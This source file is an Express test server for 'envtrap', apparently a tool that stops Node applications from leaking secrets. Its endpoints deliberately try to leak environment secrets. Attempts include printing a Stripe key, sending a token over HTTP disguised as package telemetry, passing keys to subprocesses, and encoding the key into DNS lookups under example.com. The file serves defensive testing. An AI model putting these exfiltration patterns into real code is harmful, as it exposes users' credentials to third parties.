import express from "express";
import { execSync } from "child_process";
import http from "http";
import dotenv from "dotenv";
import dns from "dns";
import { createRequire } from "module";

const require = createRequire(import.meta.url);

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(express.json());

// 1. Root Greeting
app.get("/", (req, res) => {
  res.json({
    message: "Envtrap Test Express Server is running!",
    endpoints: {
      "GET /": "This overview",
      "GET /leak-console": "Tries to print a Stripe Secret Key to stdout (console)",
      "GET /leak-http": "Tries to exfiltrate a GitHub Token via outbound HTTP request",
      "GET /leak-subprocess": "Tries to spawn a subprocess passing secrets explicitly"
    },
    protectionStatus: process.env.NODE_OPTIONS && process.env.NODE_OPTIONS.includes("envtrap") ? "Protected by envtrap" : "Not Protected"
  });
});

// 2. Outbound Stream Leak (stdout/stderr)
app.get("/leak-console", (req, res) => {
  console.log("=== EXPLICIT ATTEMPT TO PRINT SECRET TO CONSOLE ===");
  console.log(`Configured Stripe Secret Key: ${process.env.STRIPE_SECRET_KEY}`);
  console.log("====================================================");
  
  res.json({
    status: "Attempted console.log of Stripe key. Check your terminal output to see if it was redacted!",
    secretSampleRef: "sk_live_51Nz..."
  });
});

// 3. Outbound HTTPS/HTTP Leak
app.get("/leak-http", (req, res) => {
  console.log("=== EXPLICIT ATTEMPT TO SEND SECRET VIA HTTP ===");
  
  const requestOptions = {
    hostname: "localhost",
    port: PORT,
    path: "/",
    method: "GET",
    headers: {
      "Content-Type": "application/json",
      "Authorization": `Bearer ${process.env.GITHUB_TOKEN}`
    }
  };

  const request = http.request(requestOptions, (response) => {
    let responseData = "";
    response.on("data", (chunk) => { responseData += chunk; });
    response.on("end", () => {
      res.json({
        status: "HTTP request completed successfully (envtrap did not block it).",
        responseData: responseData
      });
    });
  });

  request.on("error", (error) => {
    console.error("HTTP Request Error caught inside App handler:", error.message);
    res.status(500).json({
      status: "HTTP request was blocked / failed!",
      error: error.message
    });
  });

  request.write(JSON.stringify({
    telemetry: "npm package analytic report",
    sensitiveData: process.env.STRIPE_SECRET_KEY
  }));
  
  request.end();
});

// 4. Subprocess Execution Leak (ESM)
app.get("/leak-subprocess", (req, res) => {
  console.log("=== EXPLICIT ATTEMPT TO SPAWN FORBIDDEN SUBPROCESS ===");
  try {
    const envWithSecrets = {
      ...process.env,
      STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
      GITHUB_TOKEN: process.env.GITHUB_TOKEN
    };
    
    const output = execSync("echo \"Subprocess received Stripe key: $STRIPE_SECRET_KEY\"", {
      env: envWithSecrets,
      encoding: "utf8"
    });
    
    res.json({
      status: "Subprocess execution completed.",
      output: output.trim()
    });
  } catch (error) {
    console.error("Subprocess execution failed / blocked:", error.message);
    res.status(500).json({
      status: "Subprocess execution was blocked!",
      error: error.message
    });
  }
});

// 5. Subprocess Execution Leak (CommonJS require)
app.get("/leak-subprocess-cjs", (req, res) => {
  const cp = require("child_process");
  try {
    const output = cp.execSync("echo \"CJS Subprocess\"", {
      env: { STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY },
      encoding: "utf8"
    });
    res.json({
      status: "Subprocess execution completed.",
      output: output.trim()
    });
  } catch (error) {
    res.status(500).json({
      status: "Subprocess execution was blocked!",
      error: error.message
    });
  }
});

// 6. DNS Leak (ESM)
app.get("/leak-dns-esm", (req, res) => {
  try {
    dns.lookup(`prefix.${process.env.STRIPE_SECRET_KEY}.example.com`, (err) => {
      if (err && err.code !== "ENOTFOUND" && err.code !== "EAI_AGAIN") {
        res.status(500).json({ error: err.message });
      } else {
        res.json({ status: "Success" });
      }
    });
  } catch (error) {
    res.status(500).json({
      status: "DNS resolution blocked / failed!",
      error: error.message
    });
  }
});

// 7. DNS Leak (CommonJS require)
app.get("/leak-dns-cjs", (req, res) => {
  const dnsCjs = require("dns");
  try {
    dnsCjs.lookup(`prefix.${process.env.STRIPE_SECRET_KEY}.example.com`, (err) => {
      if (err && err.code !== "ENOTFOUND" && err.code !== "EAI_AGAIN") {
        res.status(500).json({ error: err.message });
      } else {
        res.json({ status: "Success" });
      }
    });
  } catch (error) {
    res.status(500).json({
      status: "DNS resolution blocked / failed!",
      error: error.message
    });
  }
});

// 8. Clean Shutdown Endpoint
app.get("/shutdown", (req, res) => {
  res.json({ status: "Shutting down..." });
  // Allow response to send before exiting
  setTimeout(() => {
    console.log("Clean shutdown triggered via endpoint.");
    process.exit(0);
  }, 100);
});

app.listen(PORT, () => {
  console.log(`Server started on http://localhost:${PORT}`);
  console.log(`Run 'npm run secure' to test with envtrap protection.`);
});
